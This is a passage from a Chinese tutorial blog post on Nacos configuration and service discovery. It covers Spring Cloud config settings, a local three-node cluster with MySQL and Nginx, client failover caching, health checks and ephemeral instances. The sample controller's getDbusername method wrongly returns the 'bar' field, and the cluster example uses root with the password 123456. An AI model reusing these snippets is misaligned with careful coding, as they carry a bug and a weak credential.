<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/config"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>tags <span class="token operator">=</span> <span class="token string">"Nacos 配置中心演示"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigGetController</span> <span class="token punctuation">{<!-- --></span>


    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${foo.bar:empty}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> bar<span class="token punctuation">;</span>


    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.datasource.username:empty}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> dbusername<span class="token punctuation">;</span>

    <span class="token comment">//获取配置的内容</span>
    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"获取配置的内容"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/bar"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getBar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"bar is :"</span><span class="token operator">+</span>bar<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//获取配置的内容</span>
    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"获取配置的db username"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/dbusername"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDbusername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"db username is :"</span><span class="token operator">+</span>bar<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="2bootstrap_2496"></a>2）bootstrap配置文件</h6> 
<p>然后是在配置文件(bootstrap.yml)中加入以下的内容：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> nacos<span class="token punctuation">-</span>config<span class="token punctuation">-</span>demo<span class="token punctuation">-</span>provider
  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>
    <span class="token key atrule">active</span><span class="token punctuation">:</span>  dev
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">discovery</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
      <span class="token key atrule">config</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
        <span class="token key atrule">prefix</span><span class="token punctuation">:</span> nacos<span class="token punctuation">-</span>config<span class="token punctuation">-</span>demo
        <span class="token key atrule">group</span><span class="token punctuation">:</span> DEFAULT_GROUP
        <span class="token key atrule">file-extension</span><span class="token punctuation">:</span> yaml
<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">18083</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /config
</code></pre> 
<h5><a id="64__2523"></a>6.4 测试结果</h5> 
<p>启动程序，通过swagger ui访问：</p> 
<p><code>http://localhost:18083/config/swagger-ui.html#</code></p> 
<p><img src="https://images2.imgbox.com/2a/2c/V7bAtkLl_o.png" alt=""></p> 
<p>执行结果如下：</p> 
<p><img src="https://images2.imgbox.com/55/89/CGsW7E5j_o.png" alt=""></p> 
<h5><a id="64__2539"></a>6.4 可以端如何与服务端的配置文件相互对应</h5> 
<ul><li> <p>config.prefix 来对应主配置文件</p> </li><li> <p>使用spring.cloud.nacos.config.ext-config 选项来对应更多的文件</p> <p>eg：</p> </li></ul> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> nacos<span class="token punctuation">-</span>config<span class="token punctuation">-</span>demo<span class="token punctuation">-</span>provider
  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>
    <span class="token key atrule">active</span><span class="token punctuation">:</span> dev
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">discovery</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
      <span class="token key atrule">config</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
        <span class="token key atrule">prefix</span><span class="token punctuation">:</span> nacos<span class="token punctuation">-</span>config<span class="token punctuation">-</span>demo
        <span class="token key atrule">group</span><span class="token punctuation">:</span> DEFAULT_GROUP
        <span class="token key atrule">file-extension</span><span class="token punctuation">:</span> yaml
        <span class="token key atrule">ext-config</span><span class="token punctuation">:</span>
          <span class="token punctuation">-</span> <span class="token key atrule">data-id</span><span class="token punctuation">:</span> crazymaker<span class="token punctuation">-</span>db<span class="token punctuation">-</span>dev.yml
            <span class="token key atrule">group</span><span class="token punctuation">:</span> DEFAULT_GROUP
            <span class="token key atrule">refresh</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
          <span class="token punctuation">-</span> <span class="token key atrule">data-id</span><span class="token punctuation">:</span> crazymaker<span class="token punctuation">-</span>redis<span class="token punctuation">-</span>dev.yml
            <span class="token key atrule">group</span><span class="token punctuation">:</span> DEFAULT_GROUP
            <span class="token key atrule">refresh</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
          <span class="token punctuation">-</span> <span class="token key atrule">data-id</span><span class="token punctuation">:</span> crazymaker<span class="token punctuation">-</span>common<span class="token punctuation">-</span>dev.yml
            <span class="token key atrule">group</span><span class="token punctuation">:</span> DEFAULT_GROUP
            <span class="token key atrule">refresh</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
          <span class="token punctuation">-</span> <span class="token key atrule">data-id</span><span class="token punctuation">:</span> some.properties
            <span class="token key atrule">group</span><span class="token punctuation">:</span> DEFAULT_GROUP
            <span class="token key atrule">refresh</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
</code></pre> 
<p>启动程序，发现可以获取到其他data-id的配置 ,大家可以自行配置。</p> 
<h4><a id="7_2584"></a>7、配置的隔离</h4> 
<p>在实际的应用中，存在着以下几种环境隔离的要求：</p> 
<p>1、开发环境、测试环境、准生产环境和生产环境需要隔离</p> 
<p>2、不同项目需要隔离</p> 
<p>3、同一项目，不同的模块需要隔离</p> 
<p>可以通过三种方式来进行配置隔离：Nacos的服务器、namespace命名空间、group分组，在bootstrap.yml文件中可以通过配置Nacos的server-addr、namespace和group来区分不同的配置信息。</p> 
<ul><li>Nacos的服务器 spring.cloud.nacos.config.server-addr</li><li>Nacos的命名空间 spring.cloud.nacos.config.namespace，注意，这里使用命名空间的ID不是名称</li><li>Nacos的分组 spring.cloud.nacos.config.group</li></ul> 
<h4><a id="8nacos_2602"></a>8、nacos集群搭建</h4> 
<p>如果我们要搭建集群的话，那么肯定是不能用内嵌的数据库，不然数据无法共享。所以，集群搭建的时候我们需要将Nacos对接Mysql进行数据存储。</p> 
<p>集群模式跟我们平时进行扩容是一样的，可以通过Nginx转发到多个节点，最前面挂一个域名即可，如下图：</p> 
<p><img src="https://images2.imgbox.com/63/3d/WDuHl477_o.png" alt=""></p> 
<h5><a id="IP_2614"></a>IP规划</h5> 
<p>通常如果我们只是为了体验的话，直接在本地起动3个实例就可以了，没必要真的去搞三台服务器，下面我们就以在本地的方式来搭建集群。 将Nacos的解压包复制分成3份，分别是:</p> 
<p>nacos<br> nacos1<br> nacos2</p> 
<p>进入nacos的conf目录，编辑application.properties文件，增加数据库配置</p> 
<pre><code class="prism language-properties"># 指定数据源为Mysql
spring.datasource.platform=mysql

# 数据库实例数量
db.num=1
db.url.0=jdbc:mysql://localhost:3306/nacos?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true
db.user=root
db.password=123456
</code></pre> 
<p>复制代码同样的步骤进入nacos1和nacos2操作一遍，唯一需要修改的就是application.properties文件中的server.port，默认nacos的server.port=8848，</p> 
<p>我们在本地启动三个实例，那么端口肯定会冲突，所以其他2个实例的端口我们需要进行修改，比如nacos1修改成8847，nacos2修改成8846。</p> 
<p>数据库配置信息好了后，我们需要将对应的数据库和表进行初始化，数据库脚本在conf目录下的nacos-mysql.sql中，执行即可。</p> 
<p>最后一步需要配置一份集群节点信息，配置文件在conf目录下的cluster.conf.example文件，我们进行重命名成cluster.conf。 然后编辑cluster.conf文件，增加3个节点的信息，格式为IP:PORT，三个目录都一致即可。</p> 
<pre><code>127.0.0.1:8848
127.0.0.1:8847
127.0.0.1:8846
</code></pre> 
<p>启动的话直接到bin目录下，执行./startup.sh就可以了，默认就是集群模式，不需要加任何参数。</p> 
<h5><a id="_2657"></a>集群的使用</h5> 
<p>上面的集群，虽然可用， 但仍不是真正的集群， 我们一般不会这么用。nacos集群的使用一般有4种方式：</p> 
<ul><li> <p>http://ip1:port/openAPI 直连ip模式，不同的节点，则需要修改ip才可以使用。</p> </li><li> <p>http://VIP:port/openAPI VIP模式高可用，客户端vip即可，VIP下面挂server真实ip，部署比较麻烦，需要部署vip（keepalive）。</p> </li><li> <p>http://nacos.com:port/openAPI 域名模式，可读性好，而且换ip方便，在host文件配置本地域名即可。</p> </li><li> <p>http://反向代理:port/openAPI 反向代理模式</p> </li></ul> 
<blockquote> 
 <p>这里介绍一下反向代理模式。</p> 
</blockquote> 
<p>关于Nginx的安装和配置，本文就不进行讲解了，不会的可以自己去尝试下，反向代理模式 核心配置如下：</p> 
<pre><code>upstream nacos_server {
  server 127.0.0.1:8848;
  server 127.0.0.1:8847;
  server 127.0.0.1:8846;
}

server {
listen 8648;
   server_name localhost;
  #charset koi8-r;
  #access_log logs/host.access.log main;
  location / {
     proxy_pass http://nacos_server;
     index index.html index.htm;
   }
} 
</code></pre> 
<p>整体来说，nacos的集群搭建方式还是挺简单的，没什么特别要注意的，最好是能通过域名的方式来进行访问，另外数据库这块如果上生产环境，也需要考虑高可用问题，至少也得有个主从。</p> 
<p>8648 的nginx 提供的 nacos 服务接口，可以自定义。 我们访问</p> 
<p>http://localhost:8648/nacos/#/clusterManagement?dataId=&amp;group=&amp;appName=&amp;namespace=&amp;serverId=</p> 
<p>，就可以看到：</p> 
<p><img src="https://images2.imgbox.com/8c/2c/s670guTA_o.png" alt=""></p> 
<p>我们可以简单测试一下，杀掉 一个的 nacos ，看服务是否正常。 后面，我们对微服务提供nacos服务的时候，只要配置这个nginx 端口就好了！！</p> 
<h3><a id="Nacos__2716"></a>Nacos 高可用架构与实操</h3> 
<p>当我们在聊高可用时，我们在聊什么？</p> 
<ul><li>系统可用性达到 99.99%</li><li>在分布式系统中，部分节点宕机，依旧不影响系统整体运行</li><li>服务端集群化部署多个节点</li></ul> 
<p>Nacos 高可用，则是 Nacos 为了提升系统稳定性而采取的一系列手段。</p> 
<p>Nacos 的高可用不仅仅存在于服务端，同时也存在于客户端，以及一些与可用性相关的功能特性中，这些点组装起来，共同构成了 Nacos 的高可用。</p> 
<p><img src="https://images2.imgbox.com/78/6b/htqTjtzB_o.png" alt=""></p> 
<h4><a id="_2738"></a>客户端高可用</h4> 
<p>先统一一下语义，在微服务架构中一般会有三个角色：</p> 
<ul><li>Consumer</li><li>Provider</li><li>Registry</li></ul> 
<p>以上的registry 角色是 nacos-server，而 Consumer 角色和 Provider 角色都是 nacos-client。</p> 
<p><img src="https://images2.imgbox.com/54/6d/d0dEdoeC_o.png" alt=""></p> 
<h5><a id="nacosserver_2754"></a>客户端高可用的方式一：配置多个nacos-server</h5> 
<p>在生产环境，我们往往需要搭建 Nacos 集群，代码中，是这样配置的：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8081</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> 127.0.0.1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">,</span>127.0.0.1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">,</span>127.0.0.1<span class="token punctuation">:</span><span class="token number">8848</span>
</code></pre> 
<p>当其中一台Nacos server机器宕机时，为了不影响整体运行，客户端会存在重试机制。</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>nacos<span class="token punctuation">.</span>client<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>net</span><span class="token punctuation">;</span>


<span class="token comment">/**
 * @author nkorange
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NamingProxy</span> <span class="token punctuation">{<!-- --></span>

<span class="token comment">//api注册</span>

<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">reqAPI</span><span class="token punctuation">(</span><span class="token class-name">String</span> api<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> params<span class="token punctuation">,</span> <span class="token class-name">String</span> body<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> servers<span class="token punctuation">,</span> <span class="token class-name">String</span> method<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NacosException</span> <span class="token punctuation">{<!-- --></span>

params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">CommonParams</span><span class="token punctuation">.</span>NAMESPACE_ID<span class="token punctuation">,</span> <span class="token function">getNamespaceId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">CollectionUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>servers<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>nacosDomain<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NacosException</span><span class="token punctuation">(</span><span class="token class-name">NacosException</span><span class="token punctuation">.</span>INVALID_PARAM<span class="token punctuation">,</span> <span class="token string">"no server available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token class-name">NacosException</span> exception <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NacosException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>servers <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>servers<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

    <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span>servers<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">//拿到地址列表，在请求成功之前逐个尝试，直到成功为止</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> servers<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> server <span class="token operator">=</span> servers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token function">callServer</span><span class="token punctuation">(</span>api<span class="token punctuation">,</span> params<span class="token punctuation">,</span> body<span class="token punctuation">,</span> server<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NacosException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            exception <span class="token operator">=</span> e<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>NAMING_LOGGER<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                NAMING_LOGGER<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"request {} failed."</span><span class="token punctuation">,</span> server<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> servers<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
</code></pre> 
<p>该可用性保证存在于 nacos-client 端。</p> 
<h5><a id="Nacos_Java_Client_2817"></a>Nacos Java Client通用参数</h5> 
<table><thead><tr><th>参数名</th><th>含义</th><th>可选值</th><th>默认值</th><th>支持版本</th></tr></thead><tbody><tr><td>endpoint</td><td>连接Nacos Server指定的连接点，可以参考<a href="https://nacos.io/zh-cn/blog/address-server.html" rel="nofollow">文档</a></td><td>域名</td><td>空</td><td>&gt;= 0.1.0</td></tr><tr><td>endpointPort</td><td>连接Nacos Server指定的连接点端口，可以参考<a href="https://nacos.io/zh-cn/blog/address-server.html" rel="nofollow">文档</a></td><td>合法端口号</td><td>空</td><td>&gt;= 0.1.0</td></tr><tr><td>namespace</td><td>命名空间的ID</td><td>命名空间的ID</td><td>config模块为空，naming模块为public</td><td>&gt;= 0.8.0</td></tr><tr><td>serverAddr</td><td>Nacos Server的地址列表，这个值的优先级比endpoint高</td><td>ip:port,ip:port,…</td><td>空</td><td>&gt;= 0.1.0</td></tr><tr><td>JM.LOG.PATH(-D)</td><td>客户端日志的目录</td><td>目录路径</td><td>用户根目录</td><td>&gt;= 0.1.0</td></tr></tbody></table> 
<h5><a id="_Failover__2831"></a>客户端高可用的方式二：本地缓存文件 Failover 机制</h5> 
<p>注册中心发生故障最坏的一个情况是整个 Server 端宕机，如果三个Server 端都宕机了，怎么办呢？</p> 
<blockquote> 
 <p>这时候 Nacos 依旧有高可用机制做兜底。</p> 
</blockquote> 
<h6><a id="_Failover__2837"></a>本地缓存文件 Failover 机制</h6> 
<p>一道经典的 高可用的面试题：</p> 
<blockquote> 
 <p>当 springcloud 应用运行时，Nacos 注册中心宕机，会不会影响 RPC 调用。</p> 
</blockquote> 
<p>这个题目大多数人，应该都不能回答出来.</p> 
<p>Nacos 存在本地文件缓存机制，nacos-client 在接收到 nacos-server 的服务推送之后，会在内存中保存一份，随后会落盘存储一份快照snapshot 。有了这份快照，本地的RPC调用，还是能正常的进行。</p> 
<blockquote> 
 <p>关键是，这个本地文件缓存机制，默认是关闭的。</p> 
</blockquote> 
<p>Nacos 注册中心宕机，Dubbo /springcloud 应用发生重启，会不会影响 RPC 调用。如果了解了 Nacos 的 Failover 机制，应当得到和上一题同样的回答：不会。</p> 
<h6><a id="Naming_2859"></a>客户端Naming通用参数</h6> 
<table><thead><tr><th>参数名</th><th>含义</th><th>可选值</th><th>默认值</th><th>支持版本</th></tr></thead><tbody><tr><td>namingLoadCacheAtStart</td><td>启动时是否优先读取本地缓存</td><td>true/false</td><td>false</td><td>&gt;= 1.0.0</td></tr><tr><td>namingClientBeatThreadCount</td><td>客户端心跳的线程池大小</td><td>正整数</td><td>机器的CPU数的一半</td><td>&gt;= 1.0.0</td></tr><tr><td>namingPollingThreadCount</td><td>客户端定时轮询数据更新的线程池大小</td><td>正整数</td><td>机器的CPU数的一半</td><td>&gt;= 1.0.0</td></tr><tr><td>com.alibaba.nacos.naming.cache.dir(-D)</td><td>客户端缓存目录</td><td>目录路径</td><td>{user.home}/nacos/naming</td><td>&gt;= 1.0.0</td></tr><tr><td>com.alibaba.nacos.naming.log.level(-D)</td><td>Naming客户端的日志级别</td><td>info,error,warn等</td><td>info</td><td>&gt;= 1.0.0</td></tr><tr><td>com.alibaba.nacos.client.naming.tls.enable(-D)</td><td>是否打开HTTPS</td><td>true/false</td><td>false</td><td></td></tr></tbody></table> 
<p>snapshot 默认的存储路径为：{USER_HOME}/nacos/naming/ 中：</p> 
<p>这份文件有两种价值，一是用来排查服务端是否正常推送了服务；二是当客户端加载服务时，如果无法从服务端拉取到数据，会默认从本地文件中加载。</p> 
<p>在生产环境，推荐开启该参数，以避免注册中心宕机后，导致服务不可用，在服务注册发现场景，可用性和一致性 trade off 时，我们大多数时候会优先考虑可用性。</p> 
<p>另外：{USER_HOME}/nacos/naming/{namespace} 下除了缓存文件之外还有一个 failover 文件夹，里面存放着和 snapshot 一致的文件夹。</p> 
<p>这是 Nacos 的另一个 failover 机制，snapshot 是按照某个历史时刻的服务快照恢复恢复，而 failover 中的服务可以人为修改，以应对一些极端场景。</p> 
<p>该可用性保证存在于 nacos-client 端。</p> 
<h4><a id="Nacos_2890"></a>Nacos两种健康检查模式</h4> 
<h5><a id="agent_2892"></a>agent上报模式</h5> 
<p><strong>客户端（注册在nacos上的其它微服务实例）健康检查。</strong></p> 
<p>客户端通过心跳上报方式告知服务端(nacos注册中心)健康状态；</p> 
<p>默认心跳间隔5秒；</p> 
<p>nacos会在超过15秒未收到心跳后将实例设置为不健康状态；</p> 
<p>超过30秒将实例删除；</p> 
<h5><a id="_2904"></a>服务端主动检测</h5> 
<p><strong>服务端健康检查。</strong></p> 
<p>nacos主动探知客户端健康状态，默认间隔为20秒；</p> 
<p>健康检查失败后实例会被标记为不健康，不会被立即删除。</p> 
<h5><a id="_2912"></a>临时实例</h5> 
<p><strong>临时实例通过agent上报模式实现健康检查。</strong></p> 
<p>Nacos 在 1.0.0版本 <code>instance</code>级别增加了一个<code>ephemeral</code>字段，该字段表示注册的实例是否是临时实例还是持久化实例。</p> 
<p>微服务注册为临时实例：</p> 
<pre><code class="prism language-yaml"><span class="token comment"># 默认true</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
	<span class="token key atrule">cloud</span><span class="token punctuation">:</span>
		<span class="token key atrule">nacos</span><span class="token punctuation">:</span>
			<span class="token key atrule">discovery</span><span class="token punctuation">:</span>
				<span class="token key atrule">ephemeral</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
</code></pre> 
<p>注意： 默认为临时实例，表示为临时实例。</p> 
<p><img src="https://images2.imgbox.com/30/13/YLqt23fR_o.png" alt=""></p> 
<h6><a id="ephemeral_2933"></a>注册实例支持ephemeral字段</h6> 
<p>如果是临时实例，则<code>instance</code>不会在 Nacos 服务端持久化存储，需要通过上报心跳的方式进行包活，</p> 
<p>如果<code>instance</code>一段时间内没有上报心跳，则会被 Nacos 服务端摘除。</p> 
<p>在被摘除后如果又开始上报心跳，则会重新将这个实例注册。</p> 
<p>持久化实例则会持久化被 Nacos 服务端，此时即使注册实例的客户端进程不在，这个实例也不会从服务端删除，只会将健康状态设为不健康。</p> 
<p>同一个服务下可以同时有临时实例和持久化实例，这意味着当这服务的所有实例进程不在时，会有部分实例从服务上摘除，剩下的实例则会保留在服务下。</p> 
<p>使用实例的<code>ephemeral</code>来判断，<code>ephemeral</code>为<code>true</code>对应的是服务健康检查模式中的 client 模式,为<code>false</code>对应的是 server 模式。</p> 
<p>Nacos 1.0.0 之前服务的健康检查模式有三种：client、server 和none, 分别代表客户端上报、服务端探测和取消健康检查。在控制台操作的位置如下所示：</p> 
<p><img src="https://images2.imgbox.com/e2/4f/ot3ZL1IT_o.png" alt=""></p> 
<p>在 Nacos 1.0.0 中将把这个配置去掉，改为使用实例的<code>ephemeral</code>来判断，<code>ephemeral</code>为<code>true</code>对应的是服务健康检查模式中的 client 模式,为<code>false</code>对应的是 server 模式。</p> 
<h6><a id="_2957"></a>临时实例和持久化实例区别</h6> 
<p>临时和持久化的区别主要在健康检查失败后的表现，持久化实例健康检查失败后会被标记成不健康，而临时实例会直接从列表中被删除。</p> 
<p>这个特性比较适合那些需要应对流量突增，而弹性扩容的服务，当流量降下来后这些实例自己销毁自己就可以了，不用再去nacos里手动调用注销实例。持久化以后，可以实时看到健康状态，便于做后续的告警、扩容等一系列处理。</p> 
<p><img src="https://images2.imgbox.com/4c/a7/iie7O2g2_o.png" alt=""></p> 
<h4><a id="Nacos_Server_2967"></a>Nacos Server运行模式</h4> 
<p>Server的运行模式，是指 Nacos Server 可以运行在多种模式下，当前支持三种模式：</p> 
<ul><li>AP、</li><li>CP</li><li>MIXED 。</li></ul> 
<p>这里的运行模式，使用的是CAP理论里的C、A和P概念。</p> 
<p>CAP原则又称CAP定理，指的是在一个分布式系统中， Consistency（一致性）、 Availability（可用性）、Partition tolerance（分区容错性），三者不可得兼。</p> 
<p>一致性（C）：在分布式系统中的所有数据备份，在同一时刻是否同样的值。（等同于所有节点访问同一份最新的数据副本）</p> 
<p>可用性（A）：在集群中一部分节点故障后，集群整体是否还能响应客户端的读写请求。（对数据更新具备高可用性）</p> 
<p>分区容忍性（P）：以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C和A之间做出选择。</p> 
